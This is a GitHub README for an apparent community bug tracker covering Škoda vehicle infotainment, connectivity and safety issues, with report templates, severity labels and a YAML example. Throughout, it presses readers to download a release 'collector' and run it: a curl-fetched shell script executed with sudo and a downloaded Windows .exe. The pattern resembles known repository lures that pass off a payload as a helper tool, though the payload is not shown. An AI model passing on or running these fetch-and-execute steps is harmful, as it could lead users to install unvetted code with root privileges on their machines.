[![Releases](https://img.shields.io/github/v/release/Pckttt/open-skoda-bugs?label=Releases&color=informational)](https://github.com/Pckttt/open-skoda-bugs/releases)

# Open Škoda Bugs — Community Tracker for Vehicle Issues & Fixes

![Škoda enyaq banner](https://upload.wikimedia.org/wikipedia/commons/1/11/Škoda_Enyaq_iV_IMG_0196.jpg)

A community-driven tracker for bugs, issues, and enhancements in Škoda vehicles. Share findings so builds and OTA updates fix what matters. Focus: infotainment, safety, connectivity, and hardware-level quirks.

Badges
- Topics: elroq, enyaq, fabia, infotainment, kamiq, karoq, kodiaq, octavia, scala, skoda, superb
- Platform: GitHub Issues, Releases
- Use the Releases button above to grab the latest release asset and run it.

Table of contents
- What this repo does
- Supported models and scope
- How to report an issue
- Issue template and required fields
- Labels and severity
- How we triage and reproduce
- Data format and example
- Release asset: how to download and execute
- Contribution workflow
- Roadmap and backlog
- Changelog and releases
- License and maintainers

What this repo does
- Collects field reports from owners and technicians.
- Centralizes reproducible steps for car-level bugs.
- Tracks firmware, infotainment, and ECU issues.
- Provides a common data format for telemetry and logs.
- Helps prioritize fixes that affect safety and usability.

Supported models and scope
We track Škoda models that commonly see community reports:
- Enyaq (ENYAQ iV)
- Octavia
- Fabia
- Scala
- Karoq
- Kamiq
- Kodiaq
- Superb
- Elroq (concept/device references)

Scope includes:
- Infotainment: screen freezes, Bluetooth, navigation, Android Auto/Apple CarPlay.
- Connectivity: telematics, eSIM, backend pairing, remote services.
- Powertrain & hardware: ECU faults, sensors, charge management.
- Safety systems: ADAS alerts, lane assist, braking anomalies.
- UX: menus, localization, units, incorrect indicators.

How to report an issue
Use Issues on GitHub. Good reports save time and speed fixes.

Required fields in every report:
- Title: short, one line, model + brief symptom (e.g., "ENYAQ: Infotainment freeze on Bluetooth call")
- Model: exact model and year (e.g., Enyaq iV 2022)
- VIN (optional): masked to first 8 chars if you share
- Firmware/Software versions: infotainment, telematics, ECU versions
- Reproduction: step-by-step to reproduce
- Frequency: every time / often / rare
- Logs: attach logs or link to uploaded archive
- Tags: infotainment, CAN, OTA, safety, hardware

Issue template and required fields
When opening an issue, use the template below. Fill each field with plain facts.

- Summary: short text
- Environment: model, year, build, region
- Steps to reproduce:
  1. Action A
  2. Action B
- Expected result: what should happen
- Actual result: what happened
- Logs: attach file or paste trimmed logs
- Screenshots: attach images or link
- Telemetry: OBd-II snapshot or CAN dump location
- Priority: P0 (safety), P1 (major), P2 (minor), P3 (cosmetic)
- Workaround: if any

Labels and severity
We use clear labels. Use these when you file or triage.

Severity labels
- P0 - Safety: affects braking, steering, airbags, major failure.
- P1 - Major: blocks core function (infotainment crash, charging fail).
- P2 - Minor: degraded behavior (lag, wrong value).
- P3 - Cosmetic: UI, text error, paint.

Area labels
- infotainment, can-bus, telematics, charging, adas, ota, hw, sw, sensor

Status labels
- needs-info, reproducible, duplicate, wontfix, fixed, in-progress

How we triage and reproduce
We follow a simple triage flow:
1. Confirm fields and reproduction steps.
2. Ask for logs and reproduction video if missing.
3. Attempt reproduction with test scripts or emulator.
4. If reproducible, add to milestone or backlog.
5. Assign to contributor or vendor contact.

Use minimal steps and repeat them. Short steps help readers and maintainers.

Data format and example
We store structured bug data to make automation simple. Use simple YAML or JSON. Keep fields short.

Example YAML (paste into an issue or attach file):
```yaml
title: "ENYAQ: Infotainment freeze when Bluetooth call starts"
model: "Enyaq iV 2022"
region: "EU"
firmware:
  infotainment: "v3.4.12"
  telematics: "v1.8.2"
repro_steps:
  - "Pair phone via Bluetooth"
  - "Play music for 5 minutes"
  - "Accept incoming call"
actual: "Screen freezes, audio routes to phone, UI unresponsive"
expected: "Call handled and UI stays responsive"
frequency: "every time"
severity: "P1"
attachments:
  - "video_2025-01-10.mp4"
  - "infotainment_log_2025-01-10.tar.gz"
```

Keep log samples short. Redact personal data. Use simple file names.

Telemetry and log tips
- Include timestamps.
- Include versions for each module.
- Prefer CAN dumps filtered to relevant frames.
- If you send OBD-II snapshots, include PID list.
- A short video helps triage.

Release asset: how to download and execute
We publish helper tools and collectors in Releases. Download the provided asset and run it to collect logs and system info.

Download and execute the release asset from: https://github.com/Pckttt/open-skoda-bugs/releases

Typical steps (Linux/macOS):
```bash
# Download the latest collector asset from Releases page
curl -L -o skoda-collector.sh "https://github.com/Pckttt/open-skoda-bugs/releases/download/v1.0.0/skoda-collector.sh"

# Make it executable
chmod +x skoda-collector.sh

# Run with sudo if the tool needs low-level access
sudo ./skoda-collector.sh --collect all --output ./skoda-report.tar.gz
```

Typical steps (Windows, PowerShell):
```powershell
Invoke-WebRequest -Uri "https://github.com/Pckttt/open-skoda-bugs/releases/download/v1.0.0/skoda-collector-windows.zip" -OutFile "skoda-collector-windows.zip"
Expand-Archive skoda-collector-windows.zip
.\skoda-collector.exe --collect all --output .\skoda-report.zip
```

The release asset will gather logs, config dumps, and a short system report. Attach the output archive to your issue. The script runs locally and packages logs. It does not upload without your permission. Use the Releases button above or the link again here: https://github.com/Pckttt/open-skoda-bugs/releases

Contribution workflow
We accept PRs and issues. Follow this flow:
1. Open an issue describing the bug or enhancement.
2. Triage team will request logs or tests.
3. If you supply a fix or script, open a PR against main.
4. Add tests if the fix affects parsing or tooling.
5. Keep commits small and focused. Use plain messages.

Coding guidelines
- Use clear commits.
- Use small changes per PR.
- Run linters for scripts.
- Document config fields in YAML.

Maintainer roles
- Triagers: validate issues and assign labels.
- Engineers: reproduce issues, write fix, prepare repro tests.
- Release manager: publish assets and update release notes.

Automation and tooling
We use simple tools:
- A release collector script (see Releases).
- Parser scripts to extract firmware versions.
- Issue templates to guide reporters.

Sample CLI for parsing a report
```bash
python3 tools/parse_report.py --input skoda-report.tar.gz --fields firmware,errors
```

Roadmap and backlog
Short-term (next milestone)
- Add Android Auto crash signatures
- Improve collector to gather CAN metadata
- Add per-model firmware mapping

Mid-term
- Build automated regression checks for infotainment
- Add visual diff for UI screenshots
- Integrate with vendor bug trackers for faster fixes

Long-term
- Public analytics dashboard for aggregated issues
- Test harness for OTA validation across versions

Changelog and releases
Release notes live on the Releases page. Grab the latest collector there and follow the steps above to run it: https://github.com/Pckttt/open-skoda-bugs/releases

When you publish a report, reference the release version used to collect logs. That helps correlate failures with tooling.

Privacy and data handling
- Redact personal data in logs before upload.
- Remove GPS traces unless you want to share them.
- Share only what helps reproduce and fix the bug.

Common reproducible categories
- Infotainment freezes: often caused by BT codecs or app state.
- CAN misreports: often due to bus load or bad frame IDs.
- OTA failures: common with intermittent network or power loss.
- Charging anomalies: use logs from BMS and charging station.

Example issues (good vs bad)
Good:
- Title: "Octavia 2021: ADAS lane assist false steer at 80 km/h"
- Includes firmware, steps, video, CAN dump, frequency.

Bad:
- Title: "My car has a bug"
- No model, no steps, no logs.

Support and contact
Open issues for help. Use GitHub discussions for general talk and troubleshooting. For vendor escalation, include reproducible steps and attach logs.

License
This repo uses MIT for tooling and templates. Content contributed by users remains under the repo license unless otherwise stated in the contribution.

Maintainers
- Project lead: pckttt (GitHub)
- Core triagers: community volunteers
- Contact via issues or Discussions

Assets and images
Banner images come from community sources. Use images responsibly and cite sources in the repo where required.

Appendix: quick copy-paste issue template
```markdown
**Title:** [Model Year] short symptom  
**Model:**  
**Year:**  
**Region:**  
**Firmware versions:**  
**Repro steps:**  
1.  
2.  
**Actual result:**  
**Expected result:**  
**Frequency:**  
**Attachments:** (logs, video, CAN dump)  
**Severity:** (P0/P1/P2/P3)
```

Keep entries short. Keep steps reproducible. Attach logs collected from the release asset for faster fixes.

Community rules
- Keep reports factual.
- Be civil.
- Do not post personal data.
- Follow the issue template.

Use the Releases button at the top to download the latest collector and run it locally. Use the Releases page again when preparing your issue: https://github.com/Pckttt/open-skoda-bugs/releases